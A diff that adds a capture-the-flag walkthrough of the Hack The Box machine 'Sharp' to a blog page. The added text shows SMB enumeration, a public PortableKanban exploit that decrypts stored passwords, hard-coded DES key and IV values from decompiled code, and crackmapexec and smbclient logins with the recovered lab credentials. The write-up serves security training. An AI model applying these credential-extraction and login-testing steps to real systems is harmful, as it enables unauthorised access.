@@ -56,11 +56,128 @@ Nmap done: 1 IP address (1 host up) scanned in 107.93 seconds
         dev                                                     NO ACCESS
         IPC$                                                    NO ACCESS       Remote IPC
         kanban                                                  READ ONLY
-</code></pre></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><pre tabindex=0><code>└─$ smbclient -N //10.10.10.219/kanban
+Anonymous login successful
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sat Nov 14 18:56:03 2020
+  ..                                  D        0  Sat Nov 14 18:56:03 2020
+  CommandLine.dll                     A    58368  Wed Feb 27 08:06:14 2013
+  CsvHelper.dll                       A   141312  Wed Nov  8 13:52:18 2017
+  DotNetZip.dll                       A   456704  Wed Jun 22 21:31:52 2016
+  Files                               D        0  Sat Nov 14 18:57:59 2020
+  Itenso.Rtf.Converter.Html.dll       A    23040  Thu Nov 23 16:29:32 2017
+  Itenso.Rtf.Interpreter.dll          A    75776  Thu Nov 23 16:29:32 2017
+  Itenso.Rtf.Parser.dll               A    32768  Thu Nov 23 16:29:32 2017
+  Itenso.Sys.dll                      A    19968  Thu Nov 23 16:29:32 2017
+  MsgReader.dll                       A   376832  Thu Nov 23 16:29:32 2017
+  Ookii.Dialogs.dll                   A   133296  Thu Jul  3 22:20:12 2014
+  pkb.zip                             A  2558011  Thu Nov 12 20:04:59 2020
+  Plugins                             D        0  Thu Nov 12 20:05:11 2020
+  PortableKanban.cfg                  A     5819  Sat Nov 14 18:56:01 2020
+  PortableKanban.Data.dll             A   118184  Thu Jan  4 21:12:46 2018
+  PortableKanban.exe                  A  1878440  Thu Jan  4 21:12:44 2018
+  PortableKanban.Extensions.dll       A    31144  Thu Jan  4 21:12:50 2018
+  PortableKanban.pk3                  A     2080  Sat Nov 14 18:56:01 2020
+  PortableKanban.pk3.bak              A     2080  Sat Nov 14 18:55:54 2020
+  PortableKanban.pk3.md5              A       34  Sat Nov 14 18:56:03 2020
+  ServiceStack.Common.dll             A   413184  Wed Sep  6 12:18:22 2017
+  ServiceStack.Interfaces.dll         A   137216  Wed Sep  6 12:17:30 2017
+  ServiceStack.Redis.dll              A   292352  Wed Sep  6 12:02:24 2017
+  ServiceStack.Text.dll               A   411648  Wed Sep  6 04:38:18 2017
+  User Guide.pdf                      A  1050092  Thu Jan  4 21:14:28 2018
+
+                3803903 blocks of size 4096. 1462068 blocks available
+smb: \&gt; 
+</code></pre><h2 id=foothold>Foothold</h2><ul><li>Let&rsquo;s download the files<ul><li>Googling shows <a href=https://www.exploit-db.com/exploits/49409 target=_blank rel=noopener>PortableKanban password retrieval</a></li><li>Running it reveals some creds</li></ul></li></ul><pre tabindex=0><code>└─$ python3 49409.py PortableKanban.pk3
+Administrator:G2@$btRSHJYTarg
+lars:G123HHrth234gRG
+</code></pre><h3 id=re>RE</h3><ul><li>Looks like the intended path was to reverse engineer the <code>PortableKanban</code><ul><li>I&rsquo;ll open it <code>dnspy</code></li></ul></li></ul><p><img src=./images/1.png alt></p><ul><li>Click <code>Edit -> Search Assemblies</code><ul><li>Enter <code>password</code></li><li>We have <code>DbEncPassword</code> etc.</li></ul></li></ul><p><img src=./images/2.png alt></p><ul><li>Open <code>RoamingSettings</code><ul><li>We have a <code>DbEncPassword</code> which stores the encrypted password</li></ul></li></ul><pre tabindex=0><code>		public string DbEncPassword { get; set; }
+
+		// Token: 0x1700009D RID: 157
+		// (get) Token: 0x060002E3 RID: 739 RVA: 0x00029549 File Offset: 0x00027749
+		// (set) Token: 0x060002E4 RID: 740 RVA: 0x00029556 File Offset: 0x00027756
+		[Category(&#34;\t\t\t\t\t\t\t\t\t\t\tData&#34;)]
+		[DisplayName(&#34;Primary server password&#34;)]
+		[Description(&#34;Master password required to get access to primary server databases. This password is common for all the users.&#34;)]
+		[PasswordPropertyText(true)]
+		[IgnoreDataMember]
+		[Browsable(true)]
+		public string DbPassword
+		{
+			get
+			{
+				return Crypto.Decrypt(this.DbEncPassword);
+			}
+			set
+			{
+				this.DbEncPassword = Crypto.Encrypt(value.Trim());
+			}
+		}
+</code></pre><ul><li><code>Crypto.Decrypt</code><ul><li>And we see our <code>key</code> and <code>IV</code> in the code, which were used in <a href=https://www.exploit-db.com/exploits/49409 target=_blank rel=noopener>script</a></li></ul></li></ul><pre tabindex=0><code>		public static string Decrypt(string cryptedString)
+		{
+			string result;
+			try
+			{
+				if (string.IsNullOrEmpty(cryptedString))
+				{
+					result = string.Empty;
+				}
+				else
+				{
+					DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider();
+					result = new StreamReader(new CryptoStream(new MemoryStream(Convert.FromBase64String(cryptedString)), descryptoServiceProvider.CreateDecryptor(Crypto._rgbKey, Crypto._rgbIV), CryptoStreamMode.Read)).ReadToEnd();
+				}
+			}
+			catch (Exception)
+			{
+				result = string.Empty;
+			}
+			return result;
+		}
+
+		// Token: 0x04000001 RID: 1
+		private static byte[] _rgbKey = Encoding.ASCII.GetBytes(&#34;7ly6UznJ&#34;);
+
+		// Token: 0x04000002 RID: 2
+		private static byte[] _rgbIV = Encoding.ASCII.GetBytes(&#34;XuVUm5fR&#34;);
+	}
+}
+</code></pre><h3 id=shell>Shell</h3><ul><li>Let&rsquo;s test the creds we found<ul><li>We can <code>smb</code> as <code>lars</code>, but we can&rsquo;t <code>winrm</code></li></ul></li></ul><pre tabindex=0><code>└─$ crackmapexec smb 10.10.10.219 -u administrator -p &#39;G2@$btRSHJYTarg&#39;
+SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+SMB         10.10.10.219    445    SHARP            [-] Sharp\administrator:G2@$btRSHJYTarg STATUS_LOGON_FAILURE 
+</code></pre><pre tabindex=0><code>└─$ crackmapexec smb 10.10.10.219 -u administrator -p &#39;G2@$btRSHJYTarg&#39;
+SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+SMB         10.10.10.219    445    SHARP            [-] Sharp\administrator:G2@$btRSHJYTarg STATUS_LOGON_FAILURE 
+</code></pre><ul><li>Let&rsquo;s check <code>smb</code> permissions</li></ul><pre tabindex=0><code>└─$ smbmap -H 10.10.10.219 -u lars -p &#39;G123HHrth234gRG&#39; 
+[+] IP: 10.10.10.219:445        Name: 10.10.10.219                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        dev                                                     READ ONLY
+        IPC$                                                    READ ONLY       Remote IPC
+        kanban                                                  NO ACCESS
+                                                                               
+</code></pre><ul><li>Let&rsquo;s check <code>dev</code><ul><li>Check content of the <code>notes.txt</code></li></ul></li></ul><pre tabindex=0><code>└─$ smbclient //10.10.10.219/dev -U &#39;lars%G123HHrth234gRG&#39;
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun Nov 15 11:30:13 2020
+  ..                                  D        0  Sun Nov 15 11:30:13 2020
+  Client.exe                          A     5632  Sun Nov 15 10:25:01 2020
+  notes.txt                           A       70  Sun Nov 15 13:59:02 2020
+  RemotingLibrary.dll                 A     4096  Sun Nov 15 10:25:01 2020
+  Server.exe                          A     6144  Mon Nov 16 11:55:44 2020
+
+                3803903 blocks of size 4096. 1459579 blocks available
+</code></pre><pre tabindex=0><code>Todo:
+    Migrate from .Net remoting to WCF
+    Add input validation
+</code></pre><h2 id=user>User</h2><h2 id=root>Root</h2></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fsharp%2f&text=%5bHTB%5d%20Machine%3a%20Sharp&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i></a>
 <a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fsharp%2f&title=%5bHTB%5d%20Machine%3a%20Sharp" target=_blank><i class="fab fa-reddit"></i></a>
 <a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fsharp%2f&title=%5bHTB%5d%20Machine%3a%20Sharp" target=_blank><i class="fab fa-linkedin"></i></a>
 <a class="btn btn-sm email-btn" href="mailto:?subject=%5bHTB%5d%20Machine%3a%20Sharp&body=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fsharp%2f" target=_blank><i class="fas fa-envelope-open-text"></i></a></div><div class="col-md-6 btn-improve-page"><a href=https://github.com/umarbaevB/umarbaevb.github.io/edit/main/content/posts/cybersecurity/hackthebox/machines/windows/sharp/index.md title="Improve this page" target=_blank rel=noopener><i class="fas fa-code-branch"></i>
-Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/windows/servmon/ title="[HTB] Machine: Servmon" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: Servmon</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/windows/silo/ title="[HTB] Machine: Silo" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: Silo</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
+Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/windows/servmon/ title="[HTB] Machine: Servmon" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: Servmon</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/windows/silo/ title="[HTB] Machine: Silo" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: Silo</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a><ul><li><a href=#re>RE</a></li><li><a href=#shell>Shell</a></li></ul></li><li><a href=#user>User</a></li><li><a href=#root>Root</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
 Toha</a></div><div class="col-md-4 text-center">© 2020 Copyright.</div><div class="col-md-4 text-right"><a id=hugo href=https://gohugo.io/ target=_blank rel=noopener>Powered by
 <img src=/images/hugo-logo.svg alt="Hugo Logo" height=18></a></div></div></div></footer><script src=/application.6ea41b538638987eca0365babdf28c3aa16adbc59643343c39865362e701c943.js integrity="sha256-bqQbU4Y4mH7KA2W6vfKMOqFq28WWQzQ8OYZTYucByUM=" defer></script></body></html>
